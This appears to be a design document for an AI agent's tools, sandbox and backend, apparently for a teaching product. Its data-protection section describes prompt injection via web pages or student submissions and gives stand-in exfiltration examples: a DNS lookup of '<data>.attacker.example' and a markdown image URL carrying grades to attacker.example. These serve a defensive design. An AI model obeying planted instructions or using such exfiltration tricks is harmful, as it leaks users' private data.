# Tools

This page defines the agent's tools: what each takes and returns, how the caller runs them, and
the rules that keep a conversation's data in. Every tool is ours, a function tool the caller runs
beside llm_master (SPEC.md); no provider-hosted tools. Message parts are in IO.md, skills in
SKILLS-LIST.md, and the code in `agent/`.

| tool | runs on | precedent | result |
|---|---|---|---|
| read | sandbox | pi | text, or text and images |
| write | sandbox | pi | text |
| edit | sandbox | pi | text |
| bash | sandbox | pi | text |
| run_program | sandbox, calling host tools | Anthropic's programmatic tool calling | text |
| web_search | host (Exa) | exa-py's `web_search` | text and sources |
| fetch_url | host (Exa) | exa-py's `get_contents` | text and sources |
| generate_image | host (`image()`) | | text and the image; the image goes to the user |
| generate_audio | host (`speech()`) | | text; the audio goes to the user |
| review_file | sandbox | Claude Code's rule that Edit refuses a file not yet read | text and an image |
| deliver_file | host | | text; the file goes to the user |
| todo | host | Codex's `update_plan` | text |
| ask_user | the user | Claude Code's `AskUserQuestion` | text, once the user answers |
| skill | host | Claude Code's `Skill` | the skill's instructions |

file_search, search_uflo_docs, mcp and widget come later; they aren't designed here.

Each tool copies a precedent the models already know, chosen once for every provider. A result is
text, or text and images. No API takes audio in a tool result, so audio goes to the user instead.

## Keeping data in

The model may follow instructions planted in a web page or a student's submission, and so may the
code it writes. Three rules keep the conversation's data in:

- **The sandbox has no keys and no network**, DNS included. A lookup of `<data>.attacker.example`
  carries data out, so Modal's domain allowlist isn't enough. Packages come baked into the image.
- **fetch_url reads only URLs the user wrote or Exa returned**, Anthropic's rule for its own web
  fetch. The model can't build a URL that carries data out. URLs in other tools' output don't
  count, since the model can print any URL with bash.
- **The browser never loads a URL the model wrote.** Images in answers load only from the files
  origin, where the caller hosts what the tools made. The app's content security policy enforces
  it (`img-src`, and `script-src` without `'unsafe-inline'`). HTML and SVG files are downloads
  only. Otherwise `![](https://attacker.example/?d=<grades>)` sends data out the moment it
  renders.

## Running tools

The caller installs `llm-master[agent]` and builds a `Toolbox` for each request of a
conversation. It lists the tools for the config and runs the model's calls; `turn()` (The loop) is
the full version of this sketch:

```python
box = Toolbox("conv_8f2", tools=[lookup_grade], sources=saved_sources, urls=user_urls, llm=llm)
model = Model(provider="openai", model="gpt-5.5", config=Config(tools=box.specs))
response = await llm.query(model, history)
history.append(response.message)
for call in response.message.calls or []:
    result = await box.run(call.name, call.arguments)
    if result.waiting:
        continue  # the browser asks the user; the reply comes with the next request
    history.append({"role": "tool", "call_id": call.id, "content": result.content})
await box.aclose()
```

- **One request per conversation at a time.** The toolbox runs the tools that change the sandbox
  (write, edit, bash, run_program) one at a time, so two requests at once could race.
- **The conversation's id** names its sandbox.
- **`sources` and `urls`** carry state across rebuilds. `sources` are the source parts already
  sent, so numbering continues. `urls` are the URLs the user typed, which fetch_url may read.
- **`llm`** is llm_master's facade, for the generate pair. Without llm, there's no generate pair.
- **`skills`** is the caller's folder of skill folders (SKILLS-LIST.md). Without skills, there's
  no skill tool.
- **`specs`** lists the built-in tools, then the caller's own, as openai function dicts. Each
  sets `strict` off, since OpenAI's strict mode makes every optional parameter required.
- **Custom tools** are plain Python functions, sync or async. The schema comes from the signature
  and docstring, as in CONFIG.md field 6. One returns a string, a `Result`, or any JSON value, and
  raises `ToolError` to tell the model it failed.
- **`run` never raises.** It checks the arguments against the function's type hints first, so a
  wrong type is an error the model can fix. A `ToolError` reads as its message. Any other
  exception reads as the tool and the exception's type only, since its message may hold what the
  model mustn't see; the toolbox logs it.
- **A stopped turn**: the loop answers each unanswered call with `Stopped by the user.` A command
  already running runs on to its timeout.
- **`aclose()`** closes the toolbox's HTTP clients. The sandbox outlives it.

`run` returns a `Result`:

| field | meaning |
|---|---|
| `content` | the tool message's content: a string, or text and image parts (IO.md) |
| `files` | `UserFile(name, mime, data)` for the user. The caller hosts them on the files origin and sends AI SDK `file` parts |
| `sources` | AI SDK `source-url` parts. `sourceId` is the number the model cites |
| `error` | the tool failed; `content` says why |
| `waiting` | the call waits for the user; only ask_user does |

A waiting call has no result yet. The loop ends the turn, and the browser asks the user (AI SDK's
client-side tools). The next request brings the reply, and `box.resume(reply)` finishes the call
before anything else joins the history. A request without a reply declines it with None.

## The loop

`agent.turn.turn()` runs one request of a conversation. It takes the conversation's state, builds
the toolbox, adds the request's message, and loops: it calls `query()`, runs the model's calls,
and appends their results, until the model answers without a call.

```python
conversation = Conversation()  # or the saved one
async for chunk in turn(llm, model, "conv_8f2", conversation, text="Make a quiz", skills="skills"):
    ...  # AI SDK chunks, and UserFiles to host
save(conversation)
```

- **Order**: a message's calls run in parallel, except that one that changes the sandbox (write,
  edit, bash, run_program) runs alone, after the calls before it, as in Claude Code. A review_file
  sent beside the bash that builds its file reviews the new file.
- **Input**: `text` and `uploads` make a new user message; each upload goes through `box.attach`.
  `answers` finish waiting ask_user calls, by call id.
- **Output**: `start`, llm_master's chunks for each step, a `tool-output-available` or
  `tool-output-error` per result as it lands, each new source part, and `finish`. Files come out
  as `UserFile`s, for the caller to host. A tool's output chunk carries the result's text; images
  stay with the model.
- **State** is a `Conversation`: the messages, the source parts already sent, and the URLs the
  user typed. A waiting ask_user call is the last assistant message's unanswered call, so nothing
  else records it. The turn appends to the state as it goes.
- **ask_user** ends the turn once the other calls finish. The next request's answers resume it,
  and a new message instead declines it. URLs the user types into an answer join the allowlist; a
  picked option's don't, since the model wrote them.
- **Nothing new**, an empty message or answers sent twice, ends the turn without calling the model.
- **Stopping**: closing or cancelling the turn cancels the running tools and answers every open
  call with `Stopped by the user.` A stop while the model answers keeps the text it streamed as
  the step's message, then adds a user message, `[Request interrupted by user]`, as Claude Code
  does. Its reasoning and unfinished calls are dropped.
- **Failure**: a provider's error raises, as in llm_master, and the caller sends the `error` chunk.

## The backend

`server/app.py` runs the loop on Modal. Each container takes one request at a time, so llm_master's
blocking calls are fine there. `server/cli.py` drives one conversation from the terminal.

- **`POST /chat`** takes the body the AI SDK sends when it sends only the last message, `{id,
  message}`, plus `model`, one of the four the backend offers. A user message's `file` parts hold
  base64 data URLs, and each goes through `box.attach`. An assistant message carries ask_user's
  answers in its `tool-ask_user` parts. The answer streams as server-sent events in the UI message
  stream protocol.
- **`DELETE /conversations/{id}`** stops the sandbox, drops the volume and deletes the history.
  Uflo calls it when the user deletes the conversation. Nothing else deletes a conversation.
- **State** lives in the `llm-master-history` volume, a JSON file per conversation, read at the start
  of a request and written at its end, whatever ends it. No sandbox mounts that volume, and the
  sandbox has no network and no Modal token, so model-written code can't forge the history.
- **Files**: the backend never mounts a workspace volume. Every file it reads or writes goes through
  the conversation's sandbox, so the sandbox is the volume's only writer.
- **One request per conversation**: a lock in the `llm-master-locks` Dict, naming its holder and
  when it lapses. The holder pushes the time back every 20 seconds while it runs, so a container
  that dies frees its conversation within a minute. A lapsed lock passes to the first request that
  claims it under a key named for it, so two can't both take it. A second request waits up to 30
  seconds, then gets an `error` chunk.
- **Stopping**: the user stops a turn by closing the stream. Modal tells the app only when a write
  fails, so the backend pings with an SSE comment after 5 quiet seconds. The turn then stops and
  saves, and only then does the next request get the lock.
- **Delivered files** go as `file` chunks holding data URLs until the files origin exists. The AI
  SDK's file chunk has no name field, so the name rides in `providerMetadata.agent.filename`.
- **Models**: `server/__init__.py` lists the four the backend offers, each at its own thinking level.
- **Keys** reach the backend as the `llm-master-keys` Modal Secret. The sandbox gets none.
- **Preemption** would rerun a request with nobody left to stream to, so the function is
  nonpreemptible, at 3x the container's CPU and memory price.
- **Auth**: Modal's proxy auth guards the endpoint; a client sends a proxy token as
  `Authorization: Bearer wk-….ws-…`. `AGENT_PUBLIC=1` drops it, for the test apps, which live minutes
  under random names.
- **Deploying**: `modal deploy --env dev server/app.py` ships the prompt in `prompts/system.md`
  and the skills in `skills/`; `AGENT_PROMPT`, `AGENT_SKILLS` and `AGENT_APP` point elsewhere. The
  deploy also builds the sandbox image, so a package that won't install fails it.

## The sandbox

Each conversation gets one Modal sandbox, named after it and started on its first sandbox call.

- **Files** live in `/workspace`, a Modal volume of the conversation's own. A sandbox that idled
  out comes back with every file.
- **Lifetime**: Modal stops a sandbox after 15 idle minutes, and after 24 hours at most.
  `agent.sandbox.delete(conversation_id)` stops it and drops the volume, for when the
  conversation goes.
- **Names**: the conversation id must fit a Modal name: letters, digits, `-`, `_` and `.`, at
  most 54 characters. A UUID fits. Each deployment uses its own Modal environment.
- **No network**, DNS included (Keeping data in).
- **Output**: a command that prints over 64 MB stops the sandbox, since the model is root in it
  and nothing inside can be trusted to stop it. The next call starts a new one, with every file.
- **Skills** appear at `/skills/<name>/`, added from the caller's folder as the sandbox starts.
  A running sandbox keeps the skills it started with.
- **The image** is Debian slim (bookworm) with Python 3.13, LibreOffice 25.2 from
  bookworm-backports, fonts that match Calibri and Cambria, Noto with CJK, poppler, pandoc, Pillow, openpyxl,
  charset-normalizer, and Indra OCR with its weights. Nothing installs at run time, so a skill that
  needs a package lists it in the skills folder: `apt.txt` for Debian packages, `requirements.txt`
  for pip, one per line, `#` for comments. A new image reaches a conversation when its sandbox next
  starts.
- **4 CPUs**, so Indra reads a document's pages in parallel.

## Shared rules

- **Paths** are relative to `/workspace`, the conversation's folder in its sandbox, or absolute.
  Only `/workspace` survives the sandbox stopping. Host tools' paths name sandbox files too.
- **Long text** is cut at 2000 lines or 50 KB, pi's limits, with a notice saying how to read on.
  bash and run_program keep the end. Every other tool keeps the start, mid-line if it must, and
  saves the whole text in the sandbox. read pages through files itself. Calls inside a program
  aren't cut.
- **Citations** are numbers, one count across the conversation. The model writes `[3]` where it
  uses source 3.
- **Images** a tool returns are at most 1568 px on the long side, and JPEG unless transparent. A
  transparent one too big as PNG goes as JPEG on white. 1568 px stays under the 2000 px Anthropic
  allows once a request holds more than 20 images.
- **Schemas** are written by hand in each precedent's words, and a test keeps each in step with
  its function.

## The tools

### read

`read(path, offset?, limit?, pages?)` is pi's read, extended to the files teachers work with.
`offset` and `limit` count lines, as pi's do, whatever the file.

| file | result |
|---|---|
| text, code, csv | the text, without line numbers. UTF-16 with a BOM and legacy encodings decode too |
| image | the image. HEIC, AVIF, BMP and TIFF convert |
| PDF, docx, pptx and the like | the transcript: `## Page 3`, then that page's text |
| audio | the transcript: `[00:12:31] Speaker 2: …` lines |
| epub, ipynb | a plain-text copy |
| xlsx, xls, ods, numbers | every sheet as CSV when the whole fits in 25 KB. Otherwise the first 20 rows of each sheet, and a pointer to bash. A formula cell without a saved value shows its formula |
| email, video, archives, binary files, folders | an error that names what it is |

- **`pages`** is Claude Code's Read parameter: `"3"` or `"2-5"`, at most 10 pages. Each page comes
  back as an image after a `Page 3 of 14` part. This is how the model checks the files it builds.
  Files without pages refuse it.
- **Long text** gets pi's cut, and the notice also suggests searching with bash. A transcript's
  search goes through its `transcript.jsonl`.
- **A file without a view** gets one on its first read (Files).

Pages come back as images, not a PDF part, because any-llm puts only images into a Gemini tool
result.

### write

`write(path, content)` is pi's write. It creates parent folders and overwrites.

### edit

`edit(path, edits)` is pi's edit, with `edits` a list of `{oldText, newText}`.

- Each `oldText` must match the original file exactly once, and edits must not overlap.
- The file keeps its line endings and BOM.
- Failures use pi's wording.
- Like pi, it accepts `edits` as a JSON string, or one edit without the list.
- pi's fuzzy match is left out until misses show up.

### bash

`bash(command, timeout?)` is pi's bash, with Claude Code's timeout: 120 seconds by default, 600 at
most. Each call runs a fresh `bash -c` in `/workspace`, with stdin closed. The output is stdout and
stderr interleaved, cut from the top; a cut names the full log. A timeout kills everything the
command started.

### run_program

`run_program(code, timeout?)` is Anthropic's programmatic tool calling, in our sandbox. The model
writes Python that calls tools, and only what the program prints comes back. The timeout is
bash's, inner calls included.

```python
pages = await asyncio.gather(*[web_search({"query": q, "objective": "..."}) for q in queries])
print(max(pages, key=len)[:2000])
```

- **Calls.** Each tool is an async function that takes one dict and returns the result's text. A
  failed call raises `ToolError`.
- **Which tools**: web_search, fetch_url, generate_image, generate_audio, deliver_file and every
  custom tool. The program has a shell already, todo and ask_user draw UI, and skill's
  instructions and review_file's review are for the model.
- **At most 100 calls** per program.
- **The host checks every call**, since the program can send anything. Keys stay on the host.
- **Files and sources** from the calls inside reach the user, at most 50 MB of files per program.

### web_search

`web_search(query, objective, type?)` is exa-py's `web_search` tool, with Exa's `type` for depth.

- `objective` uses Exa's wording: "Goal for this search turn; say which documents should rank
  first, which should be excluded, and what specific facts or figures to pull from them."
- `type` is `auto` by default, or `deep`, Exa's slower multi-step search, which the research skill
  needs. Exa's other types trade quality for speed in ways the model can't judge.
- It returns 10 results with highlights, Exa's baseline, each numbered with its title, URL, date
  and author. Exa's notices pass on to the model; its warnings don't, as Exa asks.

### fetch_url

`fetch_url(urls)` is exa-py's `get_contents`. It reads only the URLs the second data rule allows;
anything else is an error that points at web_search. Links inside pages aren't followed. Each page
comes back whole, numbered like a search result, and a failed page doesn't fail the others.

### generate_image

`generate_image(prompt, image?)` makes an image with `image()`, or edits the image at `image`. An
edit sends the parent and the prompt together (SPEC.md, Media). A parent the edit endpoint doesn't
take, such as HEIC or BMP, goes as JPEG, or as PNG when it's transparent. The image is saved under
`images/` with a record beside it naming its parent, prompt and candidate. It reviews the image
itself, since the image has reached the user already. Openai makes it alone until llm_master falls
back (SPEC.md step 7); then gemini is the fallback.

### generate_audio

`generate_audio(text)` is one-shot speech with `speech()`, at most 4096 characters, OpenAI's limit.
The audio is saved under `audio/` and goes to the user. Openai speaks it alone until llm_master falls
back (SPEC.md step 7); then gemini is the fallback.

### review_file

`review_file(path)` checks a file the model made before deliver_file sends it. It copies Claude
Code's rule that Edit refuses a file not yet read.

- **A PDF, document or slides**: the page count, a contact sheet, and each page's first line. The
  contact sheet is every page as a numbered thumbnail on one image, under the shared image rule. It
  builds the view if it's missing (Files).
- **An image**: the image.
- **A file that can't get a view**, over 100 pages or one LibreOffice or PDFium can't open: the
  reason. The review still counts, so the file can still go out.
- **Anything else** is an error that points at read.
- **For detail**, the model reads pages with `read(path, pages=...)`.
- **It marks the version it read reviewed**: a file at `.agent/reviews/<hash>`, by the view's hash.
  The mark names the path, so deliver_file can tell a changed file from one never reviewed. Marks
  live apart from views, so a file without a view can carry one.

### deliver_file

`deliver_file(path)` sends a sandbox file to the user, one file per call.

- **A PDF, document, slides or image** goes out only once its current version is reviewed. Until
  then deliver_file refuses, in Claude Code's words: `report.docx has not been reviewed yet. Review
  it with review_file before sending it.`, or `report.docx has changed since it was reviewed. Review
  it again before sending it.` This holds for images a program made too.
- **A document or slides** goes out as the original plus `<stem>.pdf`, its view's PDF. Without a
  view, the original goes alone, and the result says so. A PDF or image goes alone.
- **Text files and spreadsheets** have no gate.

### todo

`todo(plan, explanation?)` is Codex's update_plan, with `plan` a list of `{step, status}`. It is
the simpler precedent: Claude Code's TodoWrite needs a third field per step. The tool keeps no
state, and the UI draws the latest call's plan.

### ask_user

`ask_user(questions)` is Claude Code's AskUserQuestion: 1–4 questions of 2–4 options each, without
its terminal-only `preview`. The call waits for the user (Running tools). The model then reads
Claude Code's answer text, or `User declined to answer questions`.

### skill

`skill(skill)` is Claude Code's Skill tool, without `args`, which fills placeholders our skills
don't have.

- **Finding.** The tool's description ends with one line per skill, `- name: description`, sorted
  so the prompt cache holds. Anthropic and OpenAI both list skills this way, and neither searches
  them. The toolbox doesn't own the system prompt, so the list lives in the description, as
  agentskills.io allows.
- **Reading.** A call returns the skill's instructions, wrapped as agentskills.io suggests, with
  its folder and its other files listed. The model reads those with read and runs them with bash.
- **Skill folders** follow the Agent Skills spec. SKILL.md's `name` matches its folder, and its
  `description` is at most 1024 characters. PyYAML reads the frontmatter. The skills folder holds
  real files, no symlinks, since the sandbox mounts all of it. Every folder in it is a skill,
  except dot-folders and `__pycache__`. A broken skill fails the toolbox's construction.

## Files

`box.attach(name, data)` saves an upload unchanged under `uploads/`; a taken name gets a number, as
in `notes (2).pdf`. It returns the user message's parts (IO.md): the path, and what the model gets
within read's limits. A file is 50 MB at most, and the caller caps a message at 20 files.

| upload | made at upload | the model gets |
|---|---|---|
| text | nothing | the text, or its start and a note to search it with bash |
| epub, ipynb | a plain-text copy, by pandoc | the same as text |
| image | nothing | the image |
| PDF, documents, slides | the view | the page count and the transcript, or a note to search it with bash and view pages with read |
| audio | the view | the length and the transcript, or the same note |
| spreadsheet | nothing, until a spreadsheet skill | the path |
| email, video, archives, binary files | nothing | the path, and "not supported yet" |

A PDF, document, slide deck or recording gets a **view**: a folder at `.agent/views/<hash>/`, named
for a hash of the file's bytes.

- `source.pdf`: the PDF, or LibreOffice's rendering of a document or deck.
- `pages/1.jpg`, `pages/2.jpg`, …: one image per page, under the shared image rule. PDFium draws them,
  since poppler 22 loses the check in a filled form's checkbox.
- `transcript.jsonl`: per page `{"page", "text"}`, or per line of a recording
  `{"start", "end", "speaker", "text"}`. A line is a Whisper segment, split where the speaker
  changes.
- `duration`: a recording's length in seconds.

Rules:

- **Page text comes from Indra OCR.** It reads a PDF's own text layer and OCRs only what's missing,
  so a 20-page document or scan takes a few seconds.
- **Recordings are transcribed on the host**, since the sandbox has no network: Together's Whisper,
  with speakers. The host needs `TOGETHER_API_KEY`.
- **A view is built once**, from one snapshot of the file, in a temp folder renamed into place. A
  file changed meanwhile can't land under another version's hash, a crash leaves nothing
  half-made, and parallel builds don't collide. A changed file has a new hash and a new view, so
  nothing goes stale.
- **Over 100 pages**, a file gets no view. The model gets its path and a note that it's too long for
  read.
- **A view that can't be built**, from a broken document or a failed transcription, is a note in the
  parts, not a failure. read tries again.

## Known limits

- Images stay in the history and go out again on every step. A long session of renders can hit
  Anthropic's 32 MB request cap, or its 100 images on 200k-context models. Dropping old images
  would miss the prompt cache, so nothing drops them; read's paging keeps each render small.
- Fireworks' text-only models reject an image in a tool result, so the first image a tool returns
  takes them out of the fallback chain.
- Page text is fast extraction, not Uflo's ingestion: math and figures can come out wrong. The page
  images show what the text misses.
- A deploy that changes a skill updates its instructions at once, but a running sandbox keeps the
  old files until it stops. An idle one stops after 15 minutes, a busy one after 24 hours.
- A planted instruction can still put data into a search query, which reaches Exa, not the
  attacker. Routes that need the user remain: a link the user clicks, and a downloaded HTML file
  the user opens.
